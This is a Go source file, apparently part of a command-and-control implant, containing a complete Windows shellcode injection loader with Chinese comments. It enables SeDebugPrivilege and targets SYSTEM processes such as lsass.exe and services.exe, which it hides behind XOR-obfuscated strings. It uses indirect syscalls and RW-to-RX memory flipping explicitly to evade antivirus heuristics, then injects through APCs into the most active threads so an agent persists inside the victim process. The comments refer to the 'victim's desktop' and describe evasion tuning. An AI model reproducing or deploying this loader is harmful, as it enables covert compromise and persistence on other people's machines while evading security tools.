//go:build windows
// +build windows

//进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
//注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
//对敏感字符串（注入目标进程）进行了简单的异或加密处理
//讲敏感的动态链接库名称进行了疑惑加密
//对内存权限申请进行了修改，避免使用RWX权限，改为先申请RW权限，写入后再改为RX权限

package inject

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32       = syscall.NewLazyDLL(xorDecrypt([]byte{0x1c, 0x12, 0x05, 0x19, 0x12, 0x1b, 0x44, 0x45, 0x59, 0x13, 0x1b, 0x1b}))           // kernel32.dll
	ntdll          = syscall.NewLazyDLL(xorDecrypt([]byte{0x19, 0x03, 0x13, 0x1b, 0x1b, 0x59, 0x13, 0x1b, 0x1b}))                             // ntdll.dll
	RtlMoveMemory  = ntdll.NewProc(xorDecrypt([]byte{0x25, 0x03, 0x1b, 0x3a, 0x18, 0x01, 0x12, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))          // RtlMoveMemory
	getThreadTimes = kernel32.NewProc(xorDecrypt([]byte{0x30, 0x12, 0x03, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13, 0x23, 0x1e, 0x1a, 0x12, 0x04})) // GetThreadTimes
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

// Execute 将 Shellcode 注入到目标进程并执行
func Execute(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode 为空")
	}

	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))

	// 初始化 Syscalls
	if err := InitSyscalls(); err != nil {
		fmt.Printf("[-] Warning: Syscall initialization failed, evasion might be compromised: %v\n", err)
	}

	// 0. 提升进程权限，启用 SeDebugPrivilege（关键：允许注入 SYSTEM 进程）
	if err := enableSeDebugPrivilege(); err != nil {
		fmt.Printf("[-] 警告：无法启用调试权限: %v\n", err)
		fmt.Println("[*] 将只能注入用户级进程")
	} else {
		fmt.Println("[+] SeDebugPrivilege 已启用，可注入 SYSTEM 进程")
	}

	// 1. 选择目标进程
	targetPID, targetName := findTargetProcess()
	if targetPID == 0 {
		return fmt.Errorf("未找到合适的注入目标")
	}
	fmt.Printf("[+] 选择注入目标: %s (PID: %d)\n", targetName, targetPID)

	// 验证目标进程的权限级别
	privilegeLevel := getProcessPrivilegeLevel(targetPID)
	fmt.Printf("[+] 目标进程权限级别: %s\n", privilegeLevel)

	// 2. 打开目标进程
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		return fmt.Errorf("无法打开目标进程: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	fmt.Println("[+] 目标进程已打开")

	// 3. 在目标进程中申请内存 (使用 Indirect Syscall: NtAllocateVirtualMemory)
	var baseAddr uintptr = 0
	var regionSize uintptr = uintptr(len(shellcode))

	// 关键修改：只申请 ReadWrite 权限 (0x04)，避免 RWX (0x40) 启发式查杀
	status := NtAllocateVirtualMemory(
		uintptr(hProcess),
		&baseAddr,
		0,
		&regionSize,
		MEM_COMMIT|MEM_RESERVE,
		0x04, // PAGE_READWRITE
	)

	if status != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory 失败: 0x%x", status)
	}
	fmt.Printf("[+] 目标进程内存申请成功: 0x%x (RW)\n", baseAddr)

	// 4. 写入 Shellcode 到目标进程 (使用 Indirect Syscall: NtWriteVirtualMemory)
	var bytesWritten uintptr
	status = NtWriteVirtualMemory(
		uintptr(hProcess),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if status != 0 {
		return fmt.Errorf("NtWriteVirtualMemory 失败: 0x%x", status)
	}
	fmt.Printf("[+] Payload 已写入目标进程: %d 字节\n", bytesWritten)

	// 4.5 更改内存权限 RW -> RX (使用 Indirect Syscall: NtProtectVirtualMemory)
	var oldProtect uintptr
	status = NtProtectVirtualMemory(
		uintptr(hProcess),
		&baseAddr,
		&regionSize,
		0x20, // PAGE_EXECUTE_READ
		&oldProtect,
	)
	if status != 0 {
		return fmt.Errorf("NtProtectVirtualMemory 失败 (RW->RX): 0x%x", status)
	}
	fmt.Printf("[+] 内存权限已更改为 RX (规避 RWX 扫描)\n")

	// 5. 使用 APC 注入代替 CreateRemoteThread
	// 策略：不创建新线程，而是劫持目标进程中的现有线程。
	// 优化：筛选活跃线程，优先注入到经常被调度的线程
	fmt.Println("[*] 正在尝试 APC 注入 (Active Thread Selection)...")

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return fmt.Errorf("无法创建线程快照: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	if err := windows.Thread32First(snapshot, &te); err != nil {
		return fmt.Errorf("无线程: %v", err)
	}

	// 收集目标进程的所有线程并评估活跃度
	type ThreadScore struct {
		TID   uint32
		Score int64 // CPU 时间（越高越活跃）
	}
	var candidates []ThreadScore

	for {
		if te.OwnerProcessID == targetPID {
			// 尝试打开线程获取详细信息
			hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, te.ThreadID)
			if err == nil {
				// 获取线程 CPU 时间
				var creationTime, exitTime, kernelTime, userTime windows.Filetime
				ret, _, _ := getThreadTimes.Call(
					uintptr(hThread),
					uintptr(unsafe.Pointer(&creationTime)),
					uintptr(unsafe.Pointer(&exitTime)),
					uintptr(unsafe.Pointer(&kernelTime)),
					uintptr(unsafe.Pointer(&userTime)),
				)
				if ret != 0 {
					// 计算总 CPU 时间（KernelTime + UserTime）
					totalCPU := int64(kernelTime.Nanoseconds()) + int64(userTime.Nanoseconds())
					candidates = append(candidates, ThreadScore{
						TID:   te.ThreadID,
						Score: totalCPU,
					})
				}
				windows.CloseHandle(hThread)
			}
		}

		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}

	if len(candidates) == 0 {
		return fmt.Errorf("未找到可注入的线程")
	}

	// 按活跃度排序（CPU 时间降序）
	// 使用简单的冒泡排序
	for i := 0; i < len(candidates)-1; i++ {
		for j := 0; j < len(candidates)-i-1; j++ {
			if candidates[j].Score < candidates[j+1].Score {
				candidates[j], candidates[j+1] = candidates[j+1], candidates[j]
			}
		}
	}

	// 选择前 N 个最活跃的线程注入
	maxInject := 4
	if len(candidates) < maxInject {
		maxInject = len(candidates)
	}

	injected := 0
	fmt.Printf("[*] 发现 %d 个候选线程，选择前 %d 个最活跃的线程注入\n", len(candidates), maxInject)

	for i := 0; i < maxInject; i++ {
		thread := candidates[i]
		fmt.Printf("[*] 目标线程 TID: %d (CPU时间: %d ns)\n",
			thread.TID, thread.Score)

		// 打开线程句柄 (使用 Indirect Syscall: NtOpenThread)
		var hThread uintptr
		clientId := ClientId{
			UniqueProcess: uintptr(targetPID),
			UniqueThread:  uintptr(thread.TID),
		}
		objAttr := ObjectAttributes{Length: uint32(unsafe.Sizeof(ObjectAttributes{}))}

		status = NtOpenThread(&hThread, 0x1FFFFF, &objAttr, &clientId)
		if status == 0 {
			// 成功打开线程，插入 APC
			statusApc := NtQueueApcThread(hThread, baseAddr, 0, 0, 0)
			if statusApc == 0 {
				fmt.Printf("[+] APC 已插入线程 %d\n", thread.TID)
				injected++
			} else {
				fmt.Printf("[-] APC 插入失败: 0x%x\n", statusApc)
			}
			windows.CloseHandle(windows.Handle(hThread))
		}
	}

	if injected == 0 {
		return fmt.Errorf("未能向任何线程插入 APC，注入失败")
	}

	fmt.Printf("[+] 成功向 %d 个活跃线程插入 APC (目标: %s)\n", injected, targetName)
	fmt.Println("[+] Loader 任务完成，即将退出...")

	// 不等待线程执行，让 Loader 直接退出
	// Agent 会在目标进程中持续运行
	return nil
}

// findTargetProcess 寻找合适的注入目标进程
func findTargetProcess() (uint32, string) {
	// 优先级列表：优先选择高权限进程
	targets := []string{
		// SYSTEM 权限进程
		xorDecrypt([]byte{0x04, 0x07, 0x18, 0x18, 0x1b, 0x04, 0x01, 0x59, 0x12, 0x0f, 0x12}),       // spoolsv.exe
		xorDecrypt([]byte{0x04, 0x12, 0x05, 0x01, 0x1e, 0x14, 0x12, 0x04, 0x59, 0x12, 0x0f, 0x12}), // services.exe
		xorDecrypt([]byte{0x1b, 0x04, 0x16, 0x04, 0x04, 0x59, 0x12, 0x0f, 0x12}),                   // lsass.exe

		// 用户进程
		xorDecrypt([]byte{0x12, 0x0f, 0x07, 0x1b, 0x18, 0x05, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}),                               // explorer.exe
		xorDecrypt([]byte{0x04, 0x01, 0x14, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // svchost.exe
		xorDecrypt([]byte{0x13, 0x1b, 0x1b, 0x1f, 0x18, 0x04, 0x03, 0x59, 0x12, 0x0f, 0x12}),                                     // dllhost.exe
		xorDecrypt([]byte{0x25, 0x02, 0x19, 0x03, 0x1e, 0x1a, 0x12, 0x35, 0x05, 0x18, 0x1c, 0x12, 0x05, 0x59, 0x12, 0x0f, 0x12}), // RuntimeBroker.exe
	}

	fmt.Println("[*] 扫描可注入进程...")
	for _, target := range targets {
		pid := findProcessByName(target)
		if pid != 0 {
			// 尝试打开进程验证是否有权限注入
			if canInject(pid) {
				fmt.Printf("[+] 找到可注入进程: %s (PID: %d)\n", target, pid)
				return pid, target
			} else {
				fmt.Printf("[-] 跳过: %s (PID: %d) - 权限不足\n", target, pid)
			}
		}
	}

	return 0, ""
}

// canInject 检查是否有权限注入到目标进程
func canInject(pid uint32) bool {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return false
	}
	windows.CloseHandle(hProcess)
	return true
}

// findProcessByName 通过进程名查找 PID
func findProcessByName(name string) uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return 0
	}

	for {
		processName := windows.UTF16ToString(entry.ExeFile[:])
		if processName == name {
			return entry.ProcessID
		}

		if err := windows.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}

	return 0
}

// enableSeDebugPrivilege 启用 SeDebugPrivilege 特权
// 这允许进程打开和操作 SYSTEM 权限的进程（如 winlogon.exe, lsass.exe）
func enableSeDebugPrivilege() error {
	var token windows.Token

	// 打开当前进程的访问令牌
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %v", err)
	}
	defer token.Close()

	// 查找 SeDebugPrivilege 的 LUID
	var luid windows.LUID
	privName := xorDecrypt([]byte{0x24, 0x12, 0x33, 0x12, 0x15, 0x02, 0x10, 0x27, 0x05, 0x1e, 0x01, 0x1e, 0x1b, 0x12, 0x10, 0x12})
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privName), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup privilege: %v", err)
	}

	// 构造特权结构
	privileges := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	// 调整令牌特权
	err = windows.AdjustTokenPrivileges(token, false, &privileges, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("failed to adjust token privileges: %v", err)
	}

	return nil
}

// getProcessPrivilegeLevel 获取进程的权限级别
func getProcessPrivilegeLevel(pid uint32) string {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return "Unknown (无法查询)"
	}
	defer windows.CloseHandle(hProcess)

	var token windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &token)
	if err != nil {
		return "Unknown (无法获取令牌)"
	}
	defer token.Close()

	// 获取令牌的用户 SID
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "Unknown (无法获取用户)"
	}

	// 检查是否是 SYSTEM 用户
	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err == nil && tokenUser.User.Sid.Equals(systemSid) {
		return "SYSTEM (最高权限)"
	}

	// 检查是否是管理员组成员
	adminSid, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err == nil {
		isMember, err := token.IsMember(adminSid)
		if err == nil && isMember {
			return "Administrator (管理员)"
		}
	}

	return "User (普通用户)"
}

// xorDecrypt 简单的 XOR 解密函数
func xorDecrypt(data []byte) string {
	key := byte(0x77)
	decrypted := make([]byte, len(data))
	for i, b := range data {
		decrypted[i] = b ^ key
	}
	return string(decrypted)
}
